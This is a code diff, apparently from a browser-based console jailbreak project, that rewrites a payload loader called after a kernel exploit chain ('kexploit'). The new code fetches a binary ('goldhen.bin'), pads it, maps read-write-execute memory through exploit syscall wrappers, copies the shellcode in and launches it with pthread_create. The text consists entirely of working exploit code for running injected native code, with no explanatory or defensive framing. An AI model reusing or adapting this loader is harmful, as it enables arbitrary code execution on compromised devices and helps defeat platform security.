@@ -1893,9 +1893,6 @@ kexploit().then(() => {
 })
 
 function loadPayload() {
-  const loader_addr = chain.sysp('mmap', new Int(0, 0), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
-  const tmpStubArray = array_from_address(loader_addr, 1);
-  tmpStubArray[0] = 0x00C3E7FF;
   const req = new XMLHttpRequest();
   req.responseType = "arraybuffer";
   req.open('GET','goldhen.bin');
@@ -1903,16 +1900,20 @@ function loadPayload() {
   req.onreadystatechange = function () {
    if (req.readyState == 4) {
     const PLD = req.response;
-    const payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
-    const pl = array_from_address(payload_buffer, PLD.byteLength*4);
-    const padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-    const tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-    tmp.set(new Uint8Array(req.response), 0);
-    tmp.set(padding, req.response.byteLength);
-    const shellcode = new Uint32Array(tmp.buffer);
-    pl.set(shellcode,0);
-    const pthread = malloc(0x10);
-    call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
+    const originalLength = PLD.byteLength;
+    const paddingLength = (4 - (originalLength % 4)) % 4;
+    const paddedBuffer = new Uint8Array(originalLength + paddingLength);
+    paddedBuffer.set(new Uint8Array(PLD), 0);
+    if (paddingLength) paddedBuffer.set(new Uint8Array(paddingLength), originalLength);
+    const shellcode = new Uint32Array(paddedBuffer.buffer);
+    const payload_buffer = chain.sysp('mmap', 0, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC, 0x41000, -1, 0);
+    const native_view = array_from_address(payload_buffer, shellcode.length);
+    native_view.set(shellcode);
+    chain.sys('mprotect', payload_buffer, paddedBuffer.length, PROT_READ | PROT_WRITE | PROT_EXEC);
+    const ctx = new Buffer(0x10);
+    const pthread = new Pointer();
+    pthread.ctx = ctx;
+    call_nze('pthread_create', pthread.addr, 0, payload_buffer, 0);
     allset();
     }
   };
